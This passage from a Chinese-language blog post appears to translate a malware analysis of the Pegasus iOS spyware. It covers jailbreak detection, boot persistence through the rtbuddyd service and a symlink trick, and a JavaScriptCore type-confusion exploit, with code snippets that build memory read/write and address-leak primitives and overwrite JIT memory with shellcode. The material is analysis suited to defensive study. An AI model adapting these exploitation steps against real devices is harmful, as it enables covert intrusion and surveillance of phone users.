<p>为了确定设备是否已经越狱，第2阶段尝试利用常见的越狱后门获取进入iOS内核的有效机器端口。只需通过调用<code>task _ for _ pid</code>并将PID值设置为0来执行此检查。 修改<code>task _ for _ pid</code>是iOS越狱使用的常见后门机制，它使用户模式进程有直接内核内存访问的权力。iOS通常不允许使用PID为0的<code>task _ for _ pid</code>。如果<code>task _ for _ pid</code>返回有效的任务端口，Stage 2进程就可以提升对内核的访问权限，那么就可以放弃前面描述的权限提升步骤。</p>
<p>阶段2还检查<code>/ bin / sh</code>在不在。在未越狱手机上，这个二进制文件永远不应该存在。当阶段2检测到此二进制文件的存在时，它假定现有的越狱程序与Pegasus不兼容或者所有必需的内核补丁已经到位并且不需要进一步的操作。当在设备上存在<code>/ bin / sh</code>时，阶段2不用进行攻击直接退出即可。</p>
<h2 id="四：Pegasus持久性机制"><a href="#四：Pegasus持久性机制" class="headerlink" title="四：Pegasus持久性机制"></a>四：Pegasus持久性机制</h2><p>本节详细介绍了Pegasus通过Trident漏洞进行攻击后保留在设备上的持久性机制，并在每次设备重新启动时继续执行未签名的代码。</p>
<h3 id="Pegasus持久性机制"><a href="#Pegasus持久性机制" class="headerlink" title="Pegasus持久性机制"></a>Pegasus持久性机制</h3><p>Pegasus使用的持久性机制在每次设备启动时可靠地执行未签名的代码（并最终执行内核漏洞以再次越狱设备）依赖于两个不同问题的组合。</p>
<p>第一个问题是<code>plist</code>中存在<code>rtbuddyd</code>服务（在设备启动时启动）。请注意，在iOS 10之前，rtbuddyd存在于某些iPhone设备上，例如iPhone 6S，但不存在于<code>iPhone 6</code>等其他设备上。因此，任何可以复制到指定路径（<code>/ usr / libexec / rtbuddyd</code>）的已签名二进制文件都将在引导时使用plist中指定的参数（特别是“<code>--early-boot</code>”）执行。</p>
<pre><code>&lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt;</code></pre>
<p>由于此行为，系统上的任何已签名二进制文件都可以在引导时使用单个参数执行。通过在当前工作目录中创建名为<code>--early-boot</code>的符号链接，可以将任意文件作为第一个参数传递给已复制到<code>rtbuddyd</code>位置的任意已签名二进制文件。</p>
<p>此持久性机制中利用的第二个问题是JavaScriptCore二进制文件中的漏洞。Pegasus利用前面描述的方法，通过将文件复制到<code>/ usr / libexec / rtbuddyd</code>来执行jsc二进制文件（JavaScriptCore）。然后可以通过创建名为<code>--early-boot</code>的符号链接来执行任意JavaScript代码，该符号链接指向要在引导时执行的代码文件。然后Pegasus利用jsc二进制文件中的错误转换来执行未签名的代码并重新利用内核。</p>
<h3 id="JavaScriptCore内存损坏问题"><a href="#JavaScriptCore内存损坏问题" class="headerlink" title="JavaScriptCore内存损坏问题"></a>JavaScriptCore内存损坏问题</h3><p>该问题存在于JavaScript绑定的<code>setImpureGetterDelegate（）</code>中（由<code>functionSetImpureGetterDelegate</code>支持）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">EncodeJSValue JSC_HOST_CALL <span class="title">functionSetImpureGetterDelegate</span><span class="params">(ExecState* exec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">JSLockHolder <span class="title">lock</span><span class="params">(exec)</span></span>;</span><br><span class="line">	JSValue base = exec-&gt;argument(<span class="number">0</span>)；</span><br><span class="line">	<span class="keyword">if</span>(!base.isObject())</span><br><span class="line">		<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">	JSValue delegate =exec-&gt;argument(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(!delegate.isObject())</span><br><span class="line">		<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">	ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell()));</span><br><span class="line">	impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell()));</span><br><span class="line">	<span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个绑定有两个参数：第一个是ImpureGetter，第二个是将被设置为ImpureGetter delegate的通用JSObject。这个问题是由于缺乏验证，JSObject作为第一个参数实际上是一个格式正确的ImpureGetter。当另一个对象类型作为第一个参数传递时，对象指针将不正确地向下转换为ImpureGetter指针。</p>
<p>随后，当通过<code>setDelegate（)</code>设置<code>m_delegate</code>时，指向作为第二个参数传递的JSObject的指针将写入与<code>m_delegate</code>对齐的偏移量（16个字节到提供的对象中）。此问题可用于创建一个原语，允许将指向任意JSObject的指针写入16个字节到任何其他JSObject中。</p>
<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>Pegasus利用此问题在iOS应用程序执行时实现未签名代码执行。为了获得对执行流程的控制，该攻击利用了许多<code>DataView</code>对象。使用<code>DataView</code>是因为它们提供了一种简单的机制来读取和写入向量中的任意偏移量。DataView对象在16字节偏移处有一个指向缓冲区的指针。利用这些损坏的DataView对象，漏洞利用程序安装获取任意本机代码执行权所需的工具 - 即读/写原语以及暴露任意JavaScript对象地址。完成此设置后，漏洞利用程序就可以创建包含本机代码payload的可执行映射。 以下部分详细介绍了此过程的各个阶段。</p>
<h4 id="获取任意读-写原语"><a href="#获取任意读-写原语" class="headerlink" title="获取任意读/写原语"></a>获取任意读/写原语</h4><p>可以使用以下代码片段获取用于DataView对象的任意偏移量的读/写原语。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer(<span class="number">0x20</span>);</span><br><span class="line">var dataview_init_rw = <span class="keyword">new</span> DataView(dummy_ab);</span><br><span class="line">...</span><br><span class="line">var dataview_rw = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDalagate(dataview_init_rw, dataview_rw);</span><br></pre></td></tr></table></figure>
<p>首先，使用虚拟<code>ArrayBuffer</code>作为两者的后备向量创建两个DataView。接下来，利用指向<code>dataview_rw</code>的指针来利用该问题来破坏<code>dataview_init_rw</code>的<code>m_vector</code>成员。对<code>dataview_init_rw</code> 后续读取和写入，DataView会让dataview_rw的任一成员泄露或重写。接下来，对该对象的控制用于获得整个进程存储器的读/写原语。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var DATAVIEW_ARRAYBUFFER_OFFSET = <span class="number">0x10</span>;</span><br><span class="line">var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + <span class="number">4</span>;</span><br><span class="line">var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + <span class="number">4</span>;</span><br><span class="line">var FAST_TYPED_ARRAY_MODE = <span class="number">0</span>;</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, <span class="number">0</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, <span class="number">0xFFFFFFFF</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>向dataview_rw DataView中写入三个偏移量。首先，指向后备向量的指针指向零地址。然后将DataView的长度设置为<code>0xFFFFFFFF</code>，有效地设置DataView以映射进程的所有虚拟内存。最后，将模式设置为简单类型（即<code>FastTypedArray</code>），允许在给定虚拟地址的情况下将偏移量计算到DataView中。<code>dataview_rw DataView</code>现在通过它公开的getType和setType方法提供任意读/写原语。</p>
<h4 id="泄漏对象地址"><a href="#泄漏对象地址" class="headerlink" title="泄漏对象地址"></a>泄漏对象地址</h4><p>所需的最后一个原语可以暴露任意JavaScript对象的虚拟内存地址。使用上面利用的相同问题来泄漏单个对象的地址而不是暴露整个存储器空间来实现该原语。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer (<span class="number">0x20</span>);</span><br><span class="line">...</span><br><span class="line">var dataview_leak_addr = <span class="keyword">new</span> DataView ( dummy_ab);</span><br><span class="line">var dataview_dv_leak = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDelegate (dataview_leak_addr, object_to_leak );</span><br><span class="line">leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture);</span><br></pre></td></tr></table></figure>
<p>同样，使用虚拟ArrayBuffer作为两者的支持向量创建两个DataView。接下来，用指向<code>dataview_leak_addr</code>的指针来利用该问题去破坏<code>dataview_dv_leak</code>的<code>m_vector</code>成员。为泄漏任意JavaScript对象的地址，第二次触发该问题。这次，dataview_leak_addr DataView的m_vector被需泄露的对象的地址代替。最后，可以读取<code>dataview_dv_leak DataView</code>中偏移16个字节的dword以获取目标对象的地址。</p>
<h4 id="未签名的本机代码执行"><a href="#未签名的本机代码执行" class="headerlink" title="未签名的本机代码执行"></a>未签名的本机代码执行</h4><p>如第1阶段Safari漏洞利用中所使用的那样，Pegasus在本攻击中使用相同的机制来获取代码执行权限。该漏洞创建了一个可执行映射，其中包含要执行的shellcode。为了实现这个目的，创建了一个JSFunction对象（含有数百个空的try / catch块，稍后将被覆盖）。为了帮助确保JIT将JavaScript编译为本机代码，随后会重复调用该函数。鉴于JavaScriptCore库的性质，此JIT编译的本机代码将驻留在映射为读/写/执行的内存区域中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">var body =<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="keyword">for</span> (var k=<span class="number">0</span>; k&lt;<span class="number">0x600</span>; k++)&#123;</span><br><span class="line">	body+= &#x27;try () catch(e) ();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">var to_overwrite = <span class="keyword">new</span> Function(<span class="string">&#x27;a&#x27;</span>, body);</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后可以读取此JSFunction对象的地址，并且可以读取各种成员以获取RWX映射的地址。然后用shellcode覆盖JITed try / catch块，并且可以简单地调用<code>to_overwrite（）</code>函数来实现任意代码执行。</p>
]]></content>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
</search>
